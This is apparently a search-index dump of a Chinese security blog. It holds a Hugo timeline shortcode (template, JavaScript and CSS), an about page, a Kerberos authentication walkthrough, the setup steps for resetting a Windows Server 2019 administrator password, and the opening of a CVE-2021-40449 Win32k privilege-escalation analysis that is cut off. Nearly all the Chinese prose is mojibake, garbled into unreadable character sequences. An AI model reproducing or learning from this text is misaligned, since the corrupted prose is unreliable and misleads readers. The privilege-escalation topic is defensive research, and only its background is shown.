å¤§éƒ¨åˆ†å‚è€ƒå¼•ç”¨é“¾æ¥é‡Œé¢çš„ï¼Œé­”æ”¹äº†ä¸€ä¸‹ä»¥é€‚åº”è‡ªå·±çš„ä¸»é¢˜ï¼Œå¢åŠ äº†è¿‡å»å¤šå°‘å¤©çš„æ˜¾ç¤ºã€‚\nä»£ç å®ç° åœ¨layout/shortcodesæ–°å¢æ–‡ä»¶ï¼ševent.htmlå’Œtimeline.htmlï¼Œå†…å®¹åˆ†åˆ«å¦‚ä¸‹\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // å¦‚æœæœˆä»½å¤§äº1åˆ™ if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; ç”±äºevent.htmlé‡Œé¢å¼•ç”¨äº†dayjsï¼Œè¿™ä¸ªjsä¸åœ¨å½“å‰ä¸»é¢˜å†…ï¼Œå¯ä»¥åœ¨config.tomlæ–°å¢custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]ï¼Œç„¶åæŠŠdayjs.min.jsæ”¾åœ¨theme\\hugo-theme-learn\\static\\jsç›®å½•å†…ï¼Œå³å¯è§£å†³å¯¼å…¥dayjsçš„é—®é¢˜ã€‚\næ­¤æ—¶å¯ä»¥åœ¨éœ€è¦æ·»åŠ æ—¶é—´çº¿çš„åœ°æ–¹ä½¿ç”¨timelineçš„shortcodeæ·»åŠ ï¼Œä»¥ä¸‹æ˜¯æˆ‘åšå®¢é¦–é¡µçš„æ—¶é—´çº¿ä»£ç ï¼š\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03è‡³09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} è¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§[å¢åŠ timelineåŠŸèƒ½](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29è‡³09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} å‘¨å†…å®¡è®¡äº†ä»£ç  {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} é™¤äº†è¿™ä¸ªè¿˜é¡ºä¾¿ç»™åšå®¢æ–°å¢äº†åŸºäºGithub issueçš„è¯„è®ºåŠŸèƒ½ï¼Œå‚è€ƒ\rutterancã€‚\nå‚è€ƒ\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"å…³äºæˆ‘","tags":[],"description":"","content":"å…³äºæˆ‘ 21å¹´æ¯•ä¸šï¼Œç›®å‰åœ¨æŸå®‰å…¨å‚å•†å·¥ä½œï¼Œä¸»è¦ç ”ç©¶äºŒè¿›åˆ¶ï¼Œåšä¸€äº›åº”æ€¥å“åº”æ–¹é¢çš„ä¸œè¥¿ï¼Œä¸šä½™ä¹Ÿä¼šçœ‹çœ‹webä¾§çš„ä¸€äº›ç®€å•æ¼æ´ï¼Œè¿™ä¸ªåšå®¢è®°å½•äº†æˆ‘åˆ†æçš„ä¸€äº›æ¼æ´å’Œä¸€äº›å®‰å…¨ç ”ç©¶çš„æ–‡ç« ã€‚\nä»å°æ—¶å€™åœ¨ç”µè§†ä¸Šçœ‹åˆ°é»‘å®¢åœ¨ç½‘ç»œä¸Šä¸Šå¤©å…¥åœ°æ— æ‰€ä¸èƒ½ï¼Œå¦‚ä»Šå·²å…¥å®‰å…¨è¡Œä¸šï¼Œå¸Œæœ›èƒ½å¤Ÿé•¿ä¹…ä¿æŒå¯¹ç½‘ç»œå®‰å…¨çš„å¥½å¥‡å¿ƒï¼Œä¸ä¼šè¢«æ¶ˆç£¨è‡ªå·±çš„å¥½å¥‡å¿ƒï¼Œèƒ½å¤Ÿç»™ä¸–ç•Œç•™ä¸‹ä¸€ç‚¹å±äºè‡ªå·±çš„ä¸œè¥¿ã€‚\nGitHubåœ°å€ Chestnuts4\nå¸Œæœ›å¯ä»¥è·Ÿæ•™ä¸»è¯´çš„é‚£æ ·åšæŒä¸‹å»\nå¸Œæœ›å¯ä»¥æŒä¹‹ä»¥æ’åšå®‰å…¨ç ”ç©¶ã€‚\né»‘å®¢ç²¾ç¥ï¼šOpen, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"è®¤è¯åŸç†","tags":[],"description":"","content":"è®¤è¯åŸç† ä¸€ã€Kerberosæ¦‚å¿µ Kerberosæ˜¯è®¡ç®—æœºç½‘ç»œæˆæƒåè®®ï¼Œç”¨äºåœ¨éå®‰å…¨ç½‘ç»œä¸­ï¼Œå¯¹ä¸ªäººé€šä¿¡è¿‡ç¨‹ä¸­ç”¨å®‰å…¨çš„æ‰‹æ®µè¿›è¡Œèº«ä»½è®¤è¯ã€‚å…¶ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯èƒ½å¤Ÿç›¸äº’è®¤è¯ï¼Œè¯†åˆ«å¯¹æ–¹èº«ä»½ã€‚Kerberosæ˜¯ç¬¬ä¸‰æ–¹è®¤è¯ï¼Œä¾èµ–äºç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¯¹å½¼æ­¤è¿›è¡Œèº«ä»½éªŒè¯ï¼ŒKerberosæœåŠ¡å™¨æœ¬èº«æˆä¸ºKDCã€‚ ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š\nKerberosçŸ¥é“ç”¨æˆ·å’Œé›†ç¾¤å†…æœåŠ¡ä»¥åŠå„è‡ªçš„å¯†ç æ•°æ®åº“ ASéªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯é€šè¿‡å°±ä¼šè¿”å›ç»™Clientç«¯ä¸€ä¸ªTGT Clienté€šè¿‡TGTå‘TGSè·å–ST æœåŠ¡éªŒè¯STæœ‰æ•ˆæ€§ï¼Œå¦‚æœæœ‰æ•ˆåˆ™Clientå¯ä»¥è®¿é—®æœåŠ¡ äºŒã€Kerberosåè¯è§£é‡Š ASï¼ˆAuthentication Serverï¼‰è®¤è¯æœåŠ¡å™¨ KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ TGTï¼ˆTicket Granting Ticketï¼‰ç¥¨æ®æˆæƒç¥¨æ®ï¼Œç»™ç¥¨æ®æˆæƒçš„ç¥¨æ® TGSï¼ˆTicket Granting Serviceï¼‰ç¥¨æ®æˆæƒæœåŠ¡ SSï¼ˆService Serverï¼‰æœåŠ¡æä¾›æœåŠ¡å™¨ STï¼ˆServer Ticketï¼‰æœåŠ¡ç«¯ç¥¨æ® ä¸€èˆ¬KDCåŒæ—¶åŒ…å«ASå’ŒTGS\nä¸‰ã€KerberoséªŒè¯è¿‡ç¨‹ Clientç™»å½•ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä¼šç”¨å•å‘å‡½æ•°æ ¹æ®å¯†ç ç”Ÿæˆå®¢æˆ·ç«¯å¯†é’¥ï¼ˆClient Secret Keyï¼‰\nClientå‘ASå‘é€Aæ¶ˆæ¯è¯·æ±‚TGT\nAæ¶ˆæ¯å†…å®¹ ç”¨æˆ·å è¯·æ±‚æœåŠ¡åç§°ï¼Œè¿™é‡Œæ˜¯TGS ç½‘ç»œåœ°å€ è¯·æ±‚TGTçš„ç”Ÿå‘½å‘¨æœŸ è¯¥æ¶ˆæ¯ä¸ä¼šåŠ å¯†ï¼Œä¹Ÿä¸ä¼šå‘é€å¯†ç æˆ–è€…å¯†ç ç”Ÿæˆçš„å¯†é’¥ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ASç”¨æˆ·åæ•°æ®åº“å†…ï¼Œå¹¶ä½¿ç”¨æ•°æ®åº“ä¸­ç”¨æˆ·å¯†ç ç”Ÿæˆçš„NTLMå“ˆå¸Œè§£å¯†å®¢æˆ·ç«¯æ¶ˆæ¯\nå¦‚æœæ•°æ®åº“å†…æœ‰è¯¥ç”¨æˆ·ååˆ™éšæœºç”ŸæˆTGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼ŒåŒæ—¶ç»™Clientç«¯å‘é€ä¸¤æ¡æ¶ˆæ¯\nBæ¶ˆæ¯å†…å®¹ç”¨å®¢æˆ·ç«¯å¯†é’¥åŠ å¯† TGSåç§° æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Cæ¶ˆæ¯å†…å®¹ï¼ˆTGTï¼‰ç”¨TGSå¯†é’¥ï¼ˆTGS Secret Keyï¼‰åŠ å¯† ç”¨æˆ·å TGSåç§° æ—¶é—´æˆ³ ç”¨æˆ·ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Clientç”¨é€šè¿‡å¯†ç ç”Ÿæˆçš„å®¢æˆ·ç«¯å¯†é’¥è§£å¯†Bæ¶ˆæ¯ï¼Œå¦‚æœå¯†ç æ­£ç¡®åˆ™å¯ä»¥å¾—åˆ°TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå°†Cæ¶ˆæ¯ï¼ˆTGTï¼‰å­˜å‚¨åœ¨æœ¬åœ°å‡­æ®ç¼“å­˜å†…ã€‚\nClientå‘TGSè¯·æ±‚STï¼ŒæœŸé—´éœ€è¦å‘TGSå‘é€ä¸¤æ¡æ¶ˆæ¯æ˜æ–‡\nDæ¶ˆæ¯å†…å®¹ æƒ³è¦è¯·æ±‚çš„æœåŠ¡IDå³SS ç”Ÿå‘½å‘¨æœŸ TGT Eæ¶ˆæ¯å†…å®¹ä½¿ç”¨TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰åŠ å¯†å³èº«ä»½éªŒè¯å™¨ ç”¨æˆ·å æ—¶é—´æˆ³ TGSéªŒè¯Clientè¯·æ±‚æœåŠ¡æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚\nTGSæå–Dæ¶ˆæ¯å†…çš„TGTï¼Œç”¨TGSå¯†é’¥è§£å¯†ï¼ˆTGS Secret Keyï¼‰ï¼Œä»ä¸­æå–TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†Eå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³ï¼Œç°åœ¨TGSå¾—åˆ°äº†ç”¨æˆ·åå’Œæ¶ˆæ¯Eçš„æ—¶é—´æˆ³ï¼Œä»¥åŠæ¶ˆæ¯Cçš„ç”¨æˆ·åå’Œæ—¶é—´æˆ³\næ¯”è¾ƒä¸¤ä¸ªç”¨æˆ·åå’Œæ—¶é—´æˆ³ æ£€æŸ¥TGTç”Ÿå‘½å‘¨æœŸæ˜¯å¦è¿‡æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨ï¼ˆEæ¶ˆæ¯ï¼‰æ˜¯å¦åœ¨ç¼“å­˜å†…(å­˜ç–‘) TGSç”ŸæˆéšæœºæœåŠ¡ä¼šè¯ï¼ˆservice session keyï¼‰å¯†é’¥ï¼Œå¹¶å‘é€ä¸¤æ¡æ¶ˆæ¯ç»™Client\nFæ¶ˆæ¯å†…å®¹ç”¨æœåŠ¡å¯†é’¥(Service Secret Key)åŠ å¯† ç”¨æˆ·å æœåŠ¡å æ—¶é—´æˆ³ ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ Gæ¶ˆæ¯å†…å®¹ç”¨TGSä¼šè¯å¯†é’¥åŠ å¯† æœåŠ¡å æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ å› ä¸ºClientæœ‰TGSä¼šè¯å¯†é’¥æ‰€ä»¥å¯ä»¥è§£å¯†æ¶ˆæ¯Gå¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥ï¼ˆservice session keyï¼‰\nå®¢æˆ·ç«¯å’ŒSSè¿æ¥ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯\næ¶ˆæ¯Hç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†å†…å®¹èº«ä»½éªŒè¯å™¨ï¼š ç”¨æˆ·å æ—¶é—´æˆ³ æ¶ˆæ¯L å³æ¶ˆæ¯F SSæ”¶åˆ°è¯·æ±‚ï¼Œç”¨æœåŠ¡å¯†é’¥è§£å¯†æ¶ˆæ¯Iå³æ¶ˆæ¯Få¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥åŠç”¨æˆ·åæ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå†ç”¨æœåŠ¡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³\nSSè¿›è¡Œèº«ä»½éªŒè¯\næ¯”è¾ƒæ¶ˆæ¯Hå†…ç”¨æˆ·åå’Œæ¶ˆæ¯Få†…çš„ç”¨æˆ·å æ¯”è¾ƒæ¶ˆæ¯Hå’Œæ¶ˆæ¯Få†…çš„æ˜¯æ—¶é—´æˆ³ æ£€æŸ¥æ¶ˆæ¯Få†…ç”Ÿå‘½å‘¨æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨æ˜¯å¦åœ¨ç¼“å­˜å†… SSå‘ClientéªŒè¯èº«ä»½ï¼Œå‘å…¶å‘é€æ¶ˆæ¯\næ¶ˆæ¯Jä½¿ç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†èº«ä»½éªŒè¯å™¨ æœåŠ¡ID æ—¶é—´æˆ³ï¼ˆåœ¨æ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°SSçš„èº«ä»½éªŒè¯å™¨æ¶ˆæ¯ï¼ˆJï¼‰ï¼Œä½¿ç”¨ç¼“å­˜å†…çš„æœåŠ¡ä¼šè¯å¯†é’¥è¿›è¡Œè§£å¯†å¾—åˆ°æœåŠ¡IDåŠæ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯æ˜¯å¦æœ‰æ•ˆ\nå‚è€ƒé“¾æ¥\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\nç®€åŒ–æ¨¡å‹ Clientå‘ASå‘é€æ˜æ–‡æ¶ˆæ¯ï¼Œç”³è¯·è®¿é—®çš„æœåŠ¡ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨æœ¬åœ°æ•°æ®åº“ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›ä¸¤æ¡æ¶ˆæ¯ Aï¼šClient/TGSä¼šè¯å¯†é’¥(Client/TGS Session Key)ç”¨äºClientå’ŒTGSé€šä¿¡ï¼Œé€šè¿‡ç”¨æˆ·å¯†é’¥åŠ å¯† Bï¼šTGTï¼ˆåŒ…å«Client/TGSä¼šè¯å¯†é’¥ã€ç”¨æˆ·ã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€TGTæœ‰æ•ˆæœŸï¼‰ï¼Œé€šè¿‡TGSå¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ABï¼Œç”¨è‡ªå·±çš„ç”¨æˆ·å¯†é’¥è§£å¯†æ¶ˆæ¯Aå¾—åˆ°å’ŒTGSé€šä¿¡çš„å¯†é’¥TGSä¼šè¯å¯†é’¥ Clientå‘TGSè¯·æ±‚æœåŠ¡ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯ Cï¼šæ¶ˆæ¯Bå’Œç”³è¯·çš„æœåŠ¡IDï¼ˆæ˜æ–‡ï¼‰ Dï¼šè®¤è¯ç¬¦ï¼ˆåŒ…æ‹¬ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼‰é€šè¿‡(Client/TGS Session Key)åŠ å¯† TGSæ‹¿åˆ°æœåŠ¡IDæ£€æŸ¥æ˜¯å¦æœ‰è¯¥æœåŠ¡ï¼Œå¦‚æœæœ‰è¯¥æœåŠ¡åˆ™ç”¨TGSå¯†é’¥è§£å¯†æ¶ˆæ¯Bå¾—åˆ°(Client/TGS Session Key)å†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Då¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼Œä¸TGTå†…çš„ç”¨æˆ·IDå’Œæ—¶é—´æˆ³æ¯”å¯¹éªŒè¯æœ‰æ•ˆæ€§ã€‚ é€šè¿‡ä¹‹åTGSè¿”å›ä¸¤æ¡æ¶ˆæ¯ç»™Client Eï¼šSTï¼ˆSSä¼šè¯å¯†é’¥ã€ç”¨æˆ·IDã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€æœ‰æ•ˆæœŸï¼‰é€šè¿‡SSå¯†é’¥åŠ å¯† Fï¼šSSä¼šè¯å¯†é’¥ï¼Œé€šè¿‡TGSä¼šè¯å¯†é’¥åŠ å¯† Clienté€šè¿‡TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Få¾—åˆ°SSä¼šè¯å¯†é’¥ Clientç»™SSå‘é€ä¸¤æ¡æ¶ˆæ¯ Gï¼šå³æ¶ˆæ¯E Hï¼šè®¤è¯ç¬¦ï¼ŒåŒ…å«ç”¨æˆ·IDï¼Œæ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† SSæ”¶åˆ°ä¸¤æ¡æ¶ˆæ¯ä¹‹åç”¨SSå¯†é’¥è§£å¯†æ¶ˆæ¯Gï¼ˆEï¼‰å¾—åˆ°SSä¼šè¯å¯†é’¥ï¼Œåœ¨é€šè¿‡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå¦‚æœå’Œæ¶ˆæ¯Gï¼ˆEï¼‰å†…çš„æ—¶é—´æˆ³å’Œç”¨æˆ·IDæ¯”å¯¹ï¼Œé€šè¿‡åˆ™è¿”å›æ¶ˆæ¯ç»™Client Iï¼šæ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ä¹‹åç”¨SSä¼šè¯å¯†é’¥è§£å¯†å¾—åˆ°æ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯ï¼Œé€šè¿‡åˆ™å¯ä»¥å‘SSå‘é€è¯·æ±‚ã€‚ "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"åœ¨Windows server 2019ä¸Šé‡ç½®å¯†ç ","tags":[],"description":"","content":"é‡ç½®windows server 2019çš„administratorå¯†ç  ä¹‹å‰åœ¨Vmwareä¸Šçš„Windows server 2019çš„Administratorå¯†ç å¿˜è®°äº†ï¼Œä½¿ç”¨ç½‘ä¸Šçš„æ–¹æ³•æ—¶æ‰¾ä¸åˆ°ç”¨PEå¯åŠ¨ç³»ç»Ÿçš„åŠæ³•ï¼Œæ— å¥ˆåªèƒ½ä½¿ç”¨å…¶ä»–åŠæ³•ã€‚å†™æ­¤æ–‡è®°å½•ä¸€ä¸‹ã€‚\nè®¾ç½®CD/DVD é¦–å…ˆåœ¨è™šæ‹Ÿæœº-è®¾ç½®çš„ç¡¬ä»¶é€‰é¡¹å¡ä¸‹é¢çš„CD/DVDè®¾ç½®ä¸ºä½¿ç”¨ISOæ˜ åƒæ–‡ä»¶å¹¶æ‰¾åˆ°windows server 2019é•œåƒä½ç½®ï¼Œå¦‚ä¸‹å›¾\nä¹‹åé€‰æ‹©è™šæ‹Ÿæœº-ç”µæº-å¼€æœºæ—¶æ‰“å¼€å›ºä»¶å¯åŠ¨è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºå°±ä¼šè¿›å…¥BIOSï¼Œåœ¨BIOSé‡Œé€‰æ‹©CD/DVDå¯åŠ¨ï¼Œå³ä¼šè¿›å…¥ä¸‹å›¾ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/","title":"CVE-2021-40449 Win32k æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"CVE-2021-40449 Win32kææƒæ¼æ´åŠPOCåˆ†æ èƒŒæ™¯ CVE-2021-40449æ˜¯å¡å·´æ–¯åŸºå®éªŒå®¤åœ¨2021å¹´8æœˆä¸‹æ—¬åˆ°9æœˆä¸Šæ—¬åœ¨WindowsæœåŠ¡å™¨ä¸Šæ•è·çš„æ¶æ„æ ·æœ¬åˆ©ç”¨çš„ææƒæ¼æ´ï¼Œè¯¥æ¼æ´å­˜åœ¨äºwin32kfull.sysé©±åŠ¨å†…ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥åœ¨windowsä¸­å®Œæˆä»usersåˆ°systemçš„æƒé™æå‡ã€‚\nåŸºæœ¬æ¦‚å¿µ å†…æ ¸å¯¹è±¡ï¼šå†…æ ¸å¯¹è±¡å³åœ¨å†…æ ¸ç©ºé—´å­˜åœ¨çš„å¯¹è±¡ï¼Œåªèƒ½ç”±å†…æ ¸åˆ†é…ï¼Œå†…æ ¸è®¿é—®ã€‚\nå†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹è®¿é—®åŒä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰è¿›ç¨‹éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡å†…æ ¸å°±åº”è¯¥é‡Šæ”¾è¯¥å¯¹è±¡ï¼Œæ‰€ä»¥ä¸ºäº†å‡†ç¡®çš„é‡Šæ”¾è¯¥å¯¹è±¡å°±æœ‰äº†å¼•ç”¨è®¡æ•°ã€‚å½“å†…æ ¸å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå¼•ç”¨è®¡æ•°è¢«æ ‡è®°ä¸º1ï¼Œè°ƒç”¨CloseHandle()æ—¶å†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å°±-1ï¼Œè¿™å¯ä»¥ç±»æ¯”Java GCçš„å¼•ç”¨è®¡æ•°æ³•ï¼š\nåœ¨å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å°±åŠ 